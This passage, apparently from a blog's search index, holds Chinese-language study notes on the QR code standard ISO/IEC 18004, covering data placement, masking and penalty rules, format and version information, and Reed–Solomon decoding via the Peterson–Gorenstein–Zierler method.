\u5757\uff0c\u524d\u4e24\u5757\u662f 11 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff0c\u540e\u4e24\u5757\u662f 12 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff1a \u6700\u540e\u7684\u5e8f\u5217\u5c31\u662f \\(D_1,D_{12},D_{23},D_{35},\\cdots,D_{45},D_{34},D_{46},E_1,E_{23},\\cdots,E_{88}\\) \u586b\u5145\u6570\u636e\uff087.7\uff09 \u00b6 \u628a\u524d\u9762\u5408\u6210\u7684\u5b8c\u6574\u6d88\u606f\u5e8f\u5217\u586b\u5230\u4e8c\u7ef4\u7801\u4e2d\uff0c\u9996\u5148\u8981\u5148\u586b\u5145\u529f\u80fd\u56fe\u6848\uff0c\u7136\u540e\u9884\u7559\u51fa\u683c\u5f0f\u4fe1\u606f\u3001\u7248\u672c\u4fe1\u606f\u7684\u4f4d\u7f6e \u586b\u5145\u65f6\u4ee5\u4e24\u5217\u4e3a\u5355\u4f4d\uff0c\u5373\u6bcf\u6b21\u4ea4\u66ff\u586b\u5145\u4e24\u5217\u3002\u4ece\u6700\u53f3\u4e0b\u89d2\u5f00\u59cb\u662f\u6700\u9ad8\u4f4d\u7684\u6bd4\u7279\uff0c\u7136\u540e\u4ece\u53f3\u5411\u5de6\u4ece\u4e0b\u5411\u4e0a\u4ea4\u66ff\u586b\u5145\uff0c\u5230\u4e86\u4e0a\u754c\u65f6\u5de6\u8f6c\u5411\u4e0b\u7ee7\u7eed\u586b\u5145\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u76f4\u63a5\u7a7f\u8fc7\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u8fb9\u754c\u5219\u53d8\u4e3a\u4e00\u884c \u4e5f\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u6765\u4f9d\u6b21\u586b\u5145\uff0c\u5982\u679c\u662f\u5411\u4e0a\u586b\u5145\uff0c\u5219\u6700\u9ad8\u4f4d\u5728\u4e0b\u7aef\uff0c\u53cd\u4e4b\u5728\u4e0a\u6bb5\u3002\u6bcf\u4e2a\u5b57\u8282\u5757\u5185\u7684\u6700\u9ad8\u4f4d\u5c3d\u91cf\u53d6\u6700\u53f3\u4fa7\u7684\uff0c\u4f46\u5982\u679c\u6700\u4e0b(\u4e0a)\u7aef\u53ea\u6709\u4e00\u4e2a\u6bd4\u7279\u7684\u4f4d\u7f6e\uff0c\u5219\u9009\u5b83\u4f5c\u4e3a\u6700\u9ad8\u6bd4\u7279\u7684\u4f4d\u7f6e \u53cd\u6b63\u6309\u987a\u5e8f\u6b63\u5e38\u586b\u5c31\u884c\u4e86\uff0c\u9047\u5230\u4e1c\u897f\u5c31\u7ed5 \u5177\u4f53\u89c4\u5219 \u63a9\u7801\u906e\u76d6\uff087.8\uff09 \u00b6 \u586b\u5145\u540e\u7684\u6570\u636e\u8fd8\u8981\u906e\u76d6\u4e00\u5c42\u63a9\u7801\uff08\u5f02\u6216\uff09\u6765\u5e73\u8861\u9ed1\u767d\u5757\u7684\u6570\u91cf\uff0c\u4ee5\u53ca\u51cf\u5c11\u5bb9\u6613\u4ea7\u751f\u626b\u63cf\u9519\u8bef\u7684\u5927\u5757\u548c\u5f62\u4f3c\u529f\u80fd\u56fe\u6848\u7684\u90e8\u5206\u51fa\u73b0 QR \u7801\u4e00\u5171\u6709 8 \u79cd\u63a9\u7801\uff0c\u6bcf\u4e2a\u63a9\u7801\u6709\u4e00\u4e2a 3 bits \u7684\u7f16\u53f7\uff0c\u548c\u4e00\u4e2a\u751f\u6210\u516c\u5f0f\u3002\u8fd9\u4e2a\u516c\u5f0f\u7528\u6765\u751f\u6210\u63a9\u7801\u56fe\u6837\uff0c\u4ee5\u5de6\u4e0a\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u3001\u4e0b\u4e3a\u6b63\u65b9\u5411\uff0c\u5750\u6807\u6ee1\u8db3\u8fd9\u4e2a\u516c\u5f0f\u7684\u70b9\u5728\u56fe\u6837\u4e2d\u662f\u9ed1\u8272\uff081\uff09\uff0c\u4e0d\u6ee1\u8db3\u7684\u662f\u767d\u8272\uff080\uff09\u3002\u5728\u7248\u672c 1 \u4e2d\u7684\u63a9\u7801\u56fe\u50cf\u8868\u73b0\u4e3a\uff1a \u8fdb\u884c\u63a9\u7801\u64cd\u4f5c\u5c31\u662f\u628a\u9664\u53bb\u529f\u80fd\u56fe\u6848\u548c\u7248\u672c\u4fe1\u606f\u3001\u683c\u5f0f\u4fe1\u606f\u4e4b\u5916\u7684\u6570\u636e\u90e8\u5206\u6bcf\u4e00\u5757\u7684\u503c\u4e0e\u63a9\u7801\u56fe\u6837\u5f02\u6216 \u6574\u4e2a\u64cd\u4f5c\u9700\u8981\u751f\u6210\u5206\u522b\u4f7f\u7528\u4e0d\u540c\u63a9\u7801\u7684 8 \u4e2a\u56fe\u6837\uff0c\u7136\u540e\u8ba1\u7b97\u51fa\u635f\u5931\u5206\u6570\uff08penalty points score\uff09\uff0c\u7136\u540e\u91c7\u7528\u635f\u5931\u5206\u6570\u6700\u5c0f\u7684\u63a9\u7801\u6a21\u5f0f\u4f5c\u4e3a\u6700\u7ec8\u7684\u63a9\u7801\u6a21\u5f0f \u8ba1\u7b97\u635f\u5931\u5206\u6570\uff087.8.3\uff09 \u00b6 \u867d\u7136\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c\u65f6\u4ec5\u5bf9\u975e\u529f\u80fd\u56fe\u6848\u3001\u975e\u7248\u672c\u4fe1\u606f\u683c\u5f0f\u4fe1\u606f\u7684\u6570\u636e\u533a\u57df\u8fdb\u884c\u63a9\u7801\uff0c\u4f46\u662f\u8ba1\u7b97\u635f\u5931\u5206\u6570\u65f6\u6309\u7167\u6574\u4e2a\u4e8c\u7ef4\u7801\u8ba1\u7b97 \u8ba1\u7b97\u635f\u5931\u5206\u6709\u56db\u4e2a\u89c4\u5219\uff1a \u76f8\u90bb\u4e00\u884c\u6216\u4e00\u5217\u5185\u51fa\u73b0\u8fde\u7eed\u4e94\u4e2a\u76f8\u540c\u989c\u8272\u5757\u65f6\u635f\u5931\u5206 +3\uff0c\u4e4b\u540e\u8fde\u7eed\u5757\u6570\u6bcf\u52a0\u4e00\uff0c\u635f\u5931\u5206 +1 \u5bfb\u627e\u5185\u90e8\u989c\u8272\u76f8\u540c\u7684 2*2 \u7684\u5757\uff0c\u6bcf\u51fa\u73b0\u4e00\u4e2a\u635f\u5931\u5206 +3 \u5728\u6bcf\u884c\u548c\u6bcf\u5217\u4e2d\u5bfb\u627e 10111010000 \u548c 00001011101 \uff0c\u6bcf\u51fa\u73b0\u4e00\u4e2a\u635f\u5931\u5206 +40 \u8bc4\u4f30\u9ed1\u8272\u5757\u5360\u5168\u90e8\u5757\u6570\u7684\u6bd4\u4f8b\uff0c\u5982\u679c\u5728 45%~55% \u95f4\u5219\u4e0d\u589e\u52a0\u635f\u5931\u5206\uff0c\u5728 40%~45%\u300155%~60% \u95f4\u5219\u635f\u5931\u5206 +10\uff0c\u5728 35%~40%\u300160%~65% \u95f4\u5219\u635f\u5931\u5206 +10*2\uff0c\u4ee5\u6b64\u7c7b\u63a8 \u66f4\u8be6\u7ec6\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\uff1a https://www.thonky.com/qr-code-tutorial/data-masking \u7136\u540e\u5bf9\u6240\u6709\u63a9\u7801\u7ed3\u679c\u8ba1\u7b97\u635f\u5931\u5206\u6570\u540e\u9009\u62e9\u5206\u6570\u6700\u4f4e\u7684\u4e00\u4e2a\u4f5c\u4e3a\u6700\u7ec8\u7ed3\u679c \u683c\u5f0f\u4fe1\u606f\uff087.9\uff09 \u00b6 QRCode \u7684\u683c\u5f0f\u4fe1\u606f\u662f 15 bits \u7684\u5e8f\u5217\uff0c\u5176\u4e2d\u524d 5 \u4f4d\u662f\u6570\u636e\uff0c\u540e 10 \u4f4d\u662f\u9488\u5bf9\u683c\u5f0f\u4fe1\u606f\u7684\u7ea0\u9519\u7801\uff08\u7531 (15, 5) BCH \u7801\u751f\u6210\uff09 5 bits \u7684\u6570\u636e\u524d 2 \u4f4d\u662f\u7ea0\u9519\u7b49\u7ea7\u6807\u8bc6\u7b26\uff0c\u5206\u522b\u662f L -> 01 \u3001M -> 00 \u3001Q -> 11 \u3001H -> 10 \u540e 3 \u4f4d\u662f\u4e0a\u9762\u8bf4\u5230\u7684\u63a9\u7801\u7f16\u53f7 \u7136\u540e\u540e\u63a5 10 bits \u7ea0\u9519\u7801\uff0c\u6700\u540e\u6574\u4f53\u5f02\u6216 101010000010010 \u9632\u6b62\u4ea7\u751f\u5168\u96f6\u6570\u636e\u5e8f\u5217 \u751f\u6210\u7ea0\u9519\u7801\uff08Annex C\uff09 \u00b6 \u5148\u5f97\u5230\u524d 5 bits \u7684\u6570\u636e\uff0c\u7136\u540e\u5316\u4e3a\u591a\u9879\u5f0f\uff0c\u6574\u4f53\u4e58 \\(x^{10}\\) \uff0c\u518d\u9664\u4ee5\u751f\u6210\u591a\u9879\u5f0f \\(G(x)=x^{10}+x^8+x^5+x^4+x^2+x+1\\) \u5f97\u5230\u4f59\u6570\u8f6c\u6362\u4e3a\u540e 10 bits \u7684\u7ea0\u9519\u7801 \u4f8b\u5b50 \u7ea0\u9519\u7b49\u7ea7 M\uff0c\u63a9\u7801\u7f16\u53f7 101 5 bits \u6570\u636e\uff1a 00101 \u5199\u4e3a\u591a\u9879\u5f0f\uff1a \\(x^2+1\\) \u6574\u4f53\u4e58 \\(x^{10}\\) \uff1a \\(x^{12}+x^{10}\\) \u9664\u4ee5 \\(G(x)\\) \uff1a \u5546 \\(x^2\\) \uff0c\u4f59\u6570 \\(x^7+x^6+x^4+x^3+x^2\\) \u4f59\u6570\u8f6c\u4e3a 10 bits \u7ea0\u9519\u7801\uff1a 0011011100 \u52a0\u4e0a\u539f\u6570\u636e\uff1a 001010011011100 \u5f02\u6216 101010000010010 \uff1a 100000011001110 \u56e0\u4e3a 5 bits \u7684\u6570\u636e\u4e00\u5171\u53ea\u6709 32 \u79cd\u60c5\u51b5\uff0c\u6240\u4ee5\u9644\u5f55 C \u4e2d\u76f4\u63a5\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684\u8868\u683c\uff1a \u7ea0\u9519 \uff1a\u6700\u591a\u53ef\u4ee5\u7ea0\u6b63 3 bits \u7684\u9519\u8bef\uff0c\u5148\u628a\u683c\u5f0f\u4fe1\u606f\u5f02\u6216 101010000010010 \u5f97\u5230\u539f\u59cb\u5e8f\u5217\uff0c\u7136\u540e\u4e0e Table C.1 \u4e2d\u7684\u6709\u6548\u683c\u5f0f\u4fe1\u606f\u8fdb\u884c\u5bf9\u6bd4\uff0c\u5982\u679c\u627e\u4e0d\u5230\u8bf4\u660e\u6709\u9519\u8bef\u3002\u6b64\u65f6\u4ec5\u9009\u62e9 Table C.1 \u4e2d\u4e0e\u9519\u8bef\u683c\u5f0f\u4fe1\u606f\u76f8\u5dee\u6bd4\u7279\u6700\u5c11\u7684\u4e00\u4e2a\u4f5c\u4e3a\u7ea0\u6b63\u540e\u7684\u683c\u5f0f\u4fe1\u606f\u5373\u53ef\uff0c\u5982\u679c\u76f8\u5dee\u5c11\u4e8e\u7b49\u4e8e 3 \u4e2a\u6bd4\u7279\uff0c\u5219\u89c6\u4e3a\u7ea0\u6b63\u6210\u529f \u586b\u5165\u4e8c\u7ef4\u7801 \u00b6 \u5de6\u4e0a\u89d2\u7684\u683c\u5f0f\u4fe1\u606f\u533a\u57df\u586b\u5145\u4e00\u4efd\u5b8c\u6574\u7684\u683c\u5f0f\u4fe1\u606f\uff08\u6700\u9ad8\u4f4d\u5728\u5de6\uff09\uff0c\u5de6\u4e0b\u89d2\u548c\u53f3\u4e0a\u89d2\u5408\u8d77\u6765\u662f\u4e00\u4efd\u5b8c\u6574\u7684\u683c\u5f0f\u4fe1\u606f\uff08\u6700\u9ad8\u4f4d\u5728\u5de6\u4e0b\u89d2\u7684\u6700\u4e0b\uff0c\u6700\u4f4e\u4f4d\u5728\u53f3\u4e0a\u89d2\u7684\u6700\u53f3\uff09\u3002\u5e76\u4e14\u5de6\u4e0b\u89d2\u7684\u683c\u5f0f\u4fe1\u606f\u4e0a\u65b9\uff08\u4f4d\u7f6e (4V+9,8) \uff09\u6709\u4e00\u5757\u59cb\u7ec8\u662f\u9ed1\u8272\uff1a \u7248\u672c\u4fe1\u606f\uff087.10\uff09 \u00b6 \u5728\u7248\u672c 7 \u53ca\u4ee5\u4e0a\u7684\u4e8c\u7ef4\u7801\u4e2d\u9700\u8981\u586b\u5165\u7248\u672c\u4fe1\u606f\u6765\u786e\u4fdd\u51c6\u786e\u5ea6 \u7248\u672c\u4fe1\u606f\u53ea\u50a8\u5b58\u4e86\u8be5\u4e8c\u7ef4\u7801\u7684\u7248\u672c\u53f7\uff087\uff5e40\uff09\uff0c\u4e00\u5171 18 bits\uff0c\u524d 6 bits \u4e3a\u7248\u672c\u53f7\u7684\u4e8c\u8fdb\u5236\uff08\u4ece 000111 \u5230 101000 \uff09\uff0c\u540e 12 bits \u4e3a\u7531 (18, 6) Golay code \u751f\u6210\u7684\u7ea0\u9519\u7801 \u4e0d\u540c\u4e8e\u683c\u5f0f\u4fe1\u606f\uff0c\u56e0\u4e3a\u7248\u672c\u53f7\u4e0d\u4f1a\u51fa\u73b0\u5168\u96f6\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c \u751f\u6210\u7ea0\u9519\u7801\uff08Annex D\uff09 \u00b6 \u548c\u683c\u5f0f\u4fe1\u606f\u7684\u7ea0\u9519\u7801\u7c7b\u4f3c\uff0c\u5148\u628a\u524d 6 bits \u8f6c\u4e3a\u591a\u9879\u5f0f\uff0c\u7136\u540e\u6574\u4f53\u4e58 \\(x^{12}\\) \uff0c\u5f97\u5230\u7684\u7ed3\u679c\u9664\u4ee5\u751f\u6210\u591a\u9879\u5f0f \\(G(x)=x^{12}+x^{11}+x^{10}+x^9+x^8+x^5+x^2+1\\) \uff0c\u628a\u4f59\u6570\u8f6c\u4e3a 12 bits \u4e8c\u8fdb\u5236\u5c31\u662f\u7ea0\u9519\u7801\u4e86 \u56e0\u4e3a\u53ea\u6709 34 \u4e2a\u7248\u672c\u6709\u7248\u672c\u4fe1\u606f\uff0c\u6240\u4ee5\u4e5f\u5c31\u53ea\u6709 34 \u79cd\u6709\u6548\u7684\u7248\u672c\u4fe1\u606f\u5e8f\u5217\uff0c\u9644\u5f55 D \u7684 Table D.1 \u4e2d\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684 34 \u4e2a\u7248\u672c\u4fe1\u606f\u5e8f\u5217 \u548c\u683c\u5f0f\u4fe1\u606f\u4e00\u6837\uff0c\u7ea0\u9519\u65f6\u5bf9\u7167\u8868\u683c\u9009\u62e9\u76f8\u5dee\u6bd4\u7279\u6570\u6700\u5c0f\u7684\u5373\u53ef\u3002\u5e76\u4e14\u7248\u672c\u4fe1\u606f\u4e5f\u53ea\u80fd\u7ea0\u6b63\u5c0f\u4e8e\u7b49\u4e8e 3 \u4e2a\u9519\u8bef \u586b\u5165\u4e8c\u7ef4\u7801 \u00b6 \u5728\u7248\u672c 7 \u4ee5\u4e0a\u7684\u4e8c\u7ef4\u7801\u4e2d\u5df2\u7ecf\u9884\u7559\u51fa\u4e86\u4e24\u4e2a 6*3 \u5927\u5c0f\u7684\u533a\u57df\uff0c\u4e00\u4e2a\u4f4d\u4e8e\u5de6\u4e0b\u5206\u5272\u7ebf\u7684\u4e0a\u65b9\u65f6\u5e8f\u56fe\u6848\u5de6\u4fa7\uff0c\u4e00\u4e2a\u4f4d\u4e8e\u53f3\u4e0a\u5206\u5272\u7ebf\u5de6\u4fa7\u65f6\u5e8f\u56fe\u6848\u7684\u4e0a\u65b9 \u6309\u7167\u4e0b\u56fe\u987a\u5e8f\u586b\u5165\u5373\u53ef\uff1a \u89e3\u7801\uff0811\u3001Annex B\uff09 \u00b6 \u7b80\u8981\u7684\u89e3\u7801\u8fc7\u7a0b\uff1a \u5b9a\u4f4d\u5e76\u83b7\u53d6\u56fe\u50cf\u4e2d\u7684\u4e8c\u7ef4\u7801\uff0c\u5e76\u628a\u56fe\u50cf\u4e2d\u7684\u9ed1\u767d\u5757\u63d0\u53d6\u4e3a 1 \u548c 0 \u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f \u91ca\u653e\u63a9\u7801 101010000010010 \u8fdb\u884c\u7ea0\u9519 \u5982\u679c\u7ea0\u9519\u5931\u8d25\u5219\u5c06\u4e8c\u7ef4\u7801\u955c\u9762\u5bf9\u79f0\u518d\u5c1d\u8bd5 \u8bfb\u53d6\u7248\u672c\u4fe1\u606f\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09 \u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f\u4e2d\u7684\u63a9\u7801\u7f16\u53f7\uff0c\u5e76\u91ca\u653e\u63a9\u7801 \u8bfb\u53d6\u5e76\u6062\u590d\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57 \u7ea0\u9519\uff0c\u5982\u679c\u68c0\u6d4b\u5230\u4e86\u9519\u8bef\u5c31\u7ea0\u6b63 \u628a\u6570\u636e\u5b57\u89e3\u7801\u5f97\u5230\u7ed3\u679c \u7ea0\u9519\uff08Annex B\uff09 \u00b6 Annex B \u8bb2\u7684\u7ea0\u9519\u8fc7\u7a0b\u5f88\u7b80\u7565\uff0c\u800c\u4e14\u7b26\u53f7\u8bf4\u660e\u4e0d\u5168\uff0c\u5f88\u96be\u770b\u61c2 \u53bb\u5b66\u4e86\u5b66 PGZ \u89e3\u7801\uff1a Reed\u2013Solomon_error_correction#Peterson\u2013Gorenstein\u2013Zierler_decoder \u8bbe\u5f53\u524d\u7248\u672c\u4e0b\u6bcf\u5757\u4e2d\u6709 \\(n\\) \u4e2a\u5b57\uff0c \\(k\\) \u4e2a\u6570\u636e\u5b57\uff0c \\(n-k\\) \u4e2a\u7ea0\u9519\u5b57\uff0c\u7ea0\u9519\u5bb9\u91cf\u4e3a \\(\\nu\\) \u9996\u5148\u5b9a\u4e49\u539f\u6765\u7684\u5b8c\u6574\u6570\u636e\uff08\u5373\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57\uff09\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d\u4e3a \\(c_{n-1},c_{n-2},\\cdots,c_0\\) \uff0c\u5bf9\u5e94\u591a\u9879\u5f0f\u4e3a\uff1a \\[s(x)=\\sum_{i=0}^{n-1}c_ix^i=c_{n-1}x^{n-1}+c_{n-2}x^{n-2}+\\cdots+c_0\\] \u800c\u4e14\u6839\u636e\u7ea0\u9519\u7801\u751f\u6210\u539f\u7406\uff0c \\(s(x)\\) \u53ef\u4ee5\u88ab\u751f\u6210\u591a\u9879\u5f0f \\(g(x)\\) \u6574\u9664\uff0c\u5176\u4e2d \\[g(x)=\\prod_{i=0}^{n-k-1}(x-\\alpha^i)\\] \u6240\u4ee5 \\(s(x)\\) \u4e5f\u6709\u6839 \\(s(\\alpha^i)=0, i=0,1,\\dots n-k-1\\) \u518d\u8bbe\u63a5\u6536\u5230\u7684\u6d88\u606f\u591a\u9879\u5f0f\uff08\u53ef\u80fd\u6709\u9519\uff09\u4e3a \\(r(x)\\) \uff0c\u8bef\u5dee\u591a\u9879\u5f0f\u4e3a \\(e(x)\\) \uff0c\u6ee1\u8db3\uff1a \\[r(x)=s(x)+e(x),\\quad e(x)=\\sum_{i=0}^{n-1}e_ix^i\\] \u5148\u8bbe\u4e00\u5171\u6709 \\(\\nu\\) \u4e2a\u9519\u8bef\uff0c\u4e14\u6bcf\u4e2a\u9519\u8bef\u7684\u4f4d\u7f6e\u4e3a \\(i_k,k=0,1,\\dots \\nu-1\\) \uff0c\u6240\u4ee5\u6709\uff1a \\[e(x)=\\sum_{k=0}^{\\nu-1}e_{i_k}x^{i_k}\\] \u6700\u7ec8\u7684\u76ee\u6807\u5c31\u662f\u627e\u5230\u9519\u8bef\u4e2a\u6570 \\(\\nu\\) \uff0c\u9519\u8bef\u4f4d\u7f6e \\(i_k\\) \uff0c\u4ee5\u53ca\u9519\u8bef\u5927\u5c0f \\(e_{i_k}\\) \u8ba1\u7b97\u5178\u578b\u503c \u00b6 \u9996\u5148\u5b9a\u4e49\u5178\u578b\u503c\uff08syndromes\uff09\u4e3a\u628a \\(\\alpha^j\\) \u4f20\u5165 \\(r(x)\\) \u5f97\u5230\u7684\u503c \\(S_j\\) \uff0c\u6709\uff1a \\[S_j=r(\\alpha^j)=s(\\alpha^j)+e(\\alpha^j)=e(\\alpha^j)=\\sum_{k=0}^{\\nu-1}e_{i_k}(\\alpha^j)^{i_k},j=0,1,\\dots,n-k-1\\] \u6b64\u65f6\u5982\u679c\u5f97\u5230\u7684\u5178\u578b\u503c\u90fd\u4e3a 0\uff0c\u90a3\u8bf4\u660e\u6ca1\u6709\u9519\u8bef \u4e3a\u4e86\u65b9\u4fbf\uff0c\u518d\u4ee4 \\(X_k=\\alpha^{i_k},Y_k=e_{i_k}\\) \uff0c\u8fd9\u6837 \\(X_k\\) \u4e5f\u80fd\u7528\u6765\u5b9a\u4f4d\u9519\u8bef\uff0c\u540c\u65f6\u4e5f\u6709\uff1a \\[S_j=\\sum_{k=0}^{\\nu-1}Y_kX_k^j\\] \u5199\u6210\u77e9\u9635\u5f62\u5f0f\u5c31\u662f\uff1a \\[\\begin{bmatrix} X_0^0 &X_2^0 &\\cdots &X_{\\nu-1}^0\\\\\\\\ X_0^1 &X_1^1 &\\cdots &X_{\\nu-1}^1\\\\\\\\ \\vdots &\\vdots & &\\vdots\\\\\\\\ X_0^{n-k-1} &X_1^{n-k-1} &\\cdots &X_{\\nu-1}^{n-k-1} \\end{bmatrix} \\begin{bmatrix} Y_0\\\\\\\\Y_1\\\\\\\\\\vdots\\\\\\\\Y_{\\nu-1} \\end{bmatrix}= \\begin{bmatrix} S_0\\\\\\\\S_1\\\\\\\\\\vdots\\\\\\\\S_{n-k-1} \\end{bmatrix}\\] \u6240\u4ee5\u53ea\u8981\u6c42\u5f97\u4f4d\u7f6e \\(X_k\\) \u5c31\u80fd\u5f97\u5230\u9519\u8bef\u5927\u5c0f\uff0c\u4f46\u662f\u6b64\u65f6\u5e76\u4e0d\u662f\u7ebf\u6027\u7684 \u9519\u8bef\u5b9a\u4f4d\u591a\u9879\u5f0f \u00b6 \u5b9a\u4e49\u4e00\u4e2a\u9519\u8bef\u5b9a\u4f4d\u591a\u9879\u5f0f\uff08error locator polynomial\uff09 \\(\\Lambda(x)\\) \uff1a \\[\\Lambda(x)=\\prod_{k=0}^{\\nu-1}(1-xX_k)=1+\\Lambda_1x+\\Lambda_2x^2+\\cdots+\\Lambda_\\nu x^\\nu\\] \u53ef\u4ee5\u770b\u51fa \\(\\Lambda(X_k^{-1})=0\\) \uff0c\u6240\u4ee5\u5bf9\u4e8e \\(0\\leq j\\leq\\nu-1\\) \u6709\uff1a \\[ Y_kX_k^{j+\\nu}\\Lambda(X_k^{-1}) =0 \\] \\[ Y_{k}X_{k}^{j+\\nu }(1+\\Lambda _{1}X_{k}^{-1}+\\Lambda _{2}X_{k}^{-2}+\\cdots +\\Lambda _{\\nu }X_{k}^{-\\nu })=0 \\] \\[ Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu }X_{k}^{-1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu }X_{k}^{-2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j+\\nu }X_{k}^{-\\nu }=0 \\] \\[ Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu -1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu -2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j}=0 \\] \u6240\u4ee5\u628a \\(k\\) \u4ece \\(0\\) \u5230 \\(\\nu-1\\) \u7d2f\u52a0\u8d77\u6765\u4e5f\u4e3a 0\uff1a \\[\\sum_{k=0}^{\\nu-1}\\left(Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu -1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu -2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j}\\right)=0\\] \u7136\u540e\u8f6c\u6362\u4e3a\u6bcf\u9879\u7d2f\u52a0\u5e76\u63d0\u53d6\u51fa \\(\\Lambda_i\\) \uff1a \\[\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j+\\nu }\\right)+\\Lambda _{1}\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j+\\nu -1}\\right)+\\cdots +\\Lambda _{\\nu }\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j}\\right)=0\\] \u6839\u636e\u5178\u578b\u503c\u7684\u5b9a\u4e49\u6709\uff1a \\[S_{j+\\nu}+\\Lambda_1S_{j+\\nu-1}+\\cdots+\\Lambda_\\nu S_k=0\\] \u628a \\(S_{j+\\nu}\\) \u79fb\u5230\u53f3\u8fb9\uff0c\u5e76\u5c55\u5f00\u6240\u6709 \\(j\\) \u53ef\u4ee5\u5f97\u5230\u77e9\u9635\u5f62\u5f0f\uff1a \\[\\begin{bmatrix} S_{0}&S_{1}&\\cdots &S_{\\nu-1}\\\\\\\\S_{1}&S_{2}&\\cdots &S_{\\nu}\\\\\\\\\\vdots &\\vdots &&\\vdots \\\\\\\\S_{\\nu-1}&S_{\\nu}&\\cdots &S_{2\\nu -2} \\end{bmatrix} \\begin{bmatrix}\\Lambda _{\\nu }\\\\\\\\\\Lambda _{\\nu -1}\\\\\\\\\\vdots \\\\\\\\\\Lambda _{1} \\end{bmatrix} = \\begin{bmatrix} -S_{\\nu}\\\\\\\\-S_{\\nu +1}\\\\\\\\\\vdots \\\\\\\\-S_{2\\nu-1 } \\end{bmatrix}\\] \u6b64\u65f6\u662f\u4e00\u4e2a\u7ebf\u6027\u65b9\u7a0b\u7ec4\uff0c\u800c\u4e14 \\(S_i\\) \u5168\u90e8\u5df2\u77e5\uff0c\u53ef\u4ee5\u89e3\u5f97 \\(\\Lambda_i\\) \u5f97\u5230\u9519\u8bef\u4f4d\u7f6e\u548c\u5927\u5c0f \u00b6 \u6b64\u65f6\u591a\u9879\u5f0f \\(\\Lambda(x)\\) \u5df2\u7ecf\u5b8c\u5168\u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u6c42\u5f97\u5176\u6839\uff08\u7528 Chien search \u7b97\u6cd5\u5728\u4f3d\u7f57\u74e6\u57df\u4e0a\u6c42\u6839\uff09 \u518d\u7b97\u5176\u5012\u6570\u5373\u53ef\u5f97\u5230 \\(X_k\\) \uff0c\u7136\u540e\u53ef\u4ee5\u5bfb\u627e\u5230\u9519\u8bef\u4f4d\u7f6e \\(i_k\\) \u8fd9\u65f6\u4e5f\u5c31\u53ef\u4ee5\u5e26\u5165\u7b2c\u4e00\u4e2a\u65b9\u7a0b\u7ec4\u6c42\u5f97\u9519\u8bef\u5927\u5c0f \\(Y_k\\) \uff08\u6216\u8005\u5229\u7528 Forney algorithm\uff09 \u5f97\u5230\u4e86 \\(e(x)\\) \u540e\u5c31\u53ef\u4ee5\u6839\u636e \\(r(x)\\) \u7b97\u51fa\u539f\u59cb\u4fe1\u606f \\(s(x)\\) \u4e86","title":"QRCode"},{"location":"ctf/qrcode/#qrcode","text":"\u6700\u8fd1\u51e0\u6b21\u6bd4\u8d5b\u9047\u5230\u8fc7\u597d\u51e0\u6b21\u4e8c\u7ef4\u7801\u7684\u9898\u76ee\uff0c\u6253\u7b97\u597d\u597d\u6765\u8bfb\u4e00\u8bfb\u6807\u51c6\u6587\u6863 ISO/IEC 18004:2015 \u6587\u6863 6.1 \u524d\u9762\u7684\u5185\u5bb9\u4e0d\u591a\uff0c\u5c31\u4ece\u5b83\u540e\u9762\u5f00\u59cb\u8bb0\u4e86","title":"\u4e8c\u7ef4\u7801 QRCode \u6807\u51c6\u9605\u8bfb"},{"location":"ctf/qrcode/#6163","text":"","title":"\u57fa\u7840\u63cf\u8ff0\u53ca\u7ed3\u6784\uff086.1\u30016.3\uff09"},{"location":"ctf/qrcode/#5361","text":"\u5757\u4f4d\u7f6e\uff1a\u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9 (0, 0) \u5411\u4e0bx+\uff0c\u5411\u53f3y+ \u7248\u672c\u8868\u793a\uff1aVersion V-E\uff08\u5176\u4e2dV\u662f\u7248\u672c\u53f7\uff0cE\u662f\u7ea0\u9519\u7b49\u7ea7\uff09 \u6570\u636e\u8868\u793a\uff1a\u9ed1\u5757-1 \u767d\u5757-0\uff08\u53ef\u4ee5\u5e26\u80cc\u666f\u5168\u90e8\u53cd\u8272\uff09 \u5927\u5c0f\uff1a\u4ece\u7248\u672c1\u5230\u7248\u672c40\u4f9d\u6b21\u662f 21x21 \uff5e 177x177\uff08\u6bcf\u589e\u52a0\u4e00\u4e2a\u7248\u672c\uff0c\u8fb9\u957f\u589e\u52a04\uff09 \u652f\u6301\u7684\u6700\u591a\u5b57\u7b26\u6570\uff08\u7248\u672c40\uff09 \u6570\u5b57\u6a21\u5f0f\uff1a7089 \u5b57\u6bcd\u6a21\u5f0f\uff1a4296 \u5b57\u8282\u6a21\u5f0f\uff1a2953 \u65e5\u6587\u6a21\u5f0f\uff1a1817 \u7ea0\u9519\u7b49\u7ea7\u5141\u8bb8\u7684\u6062\u590d\u6bd4\u4f8b L\uff1a7% M\uff1a15% 